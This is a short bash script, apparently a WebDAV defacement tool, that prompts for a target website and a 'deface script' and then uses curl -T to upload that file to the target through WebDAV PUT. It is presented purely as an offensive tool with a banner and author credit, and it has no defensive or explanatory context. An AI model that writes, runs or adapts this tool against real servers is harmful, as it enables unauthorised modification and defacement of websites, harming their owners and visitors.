#!/bin/bash
# Copyright by braderlala-dev

clear
figlet -f smshadow " Webdav " | lolcat
echo "  Coded by Braderlala-dev  •  Version 0.1 " | lolcat
echo "-------------------------------------" | lolcat
printf " WebTarget : " | lolcat
read wt
printf " Script Defacenya : " | lolcat
read sd
echo "-------------------------------------" | lolcat
curl -T $sd $wt
echo " output > "$wt/$sd | lolcat
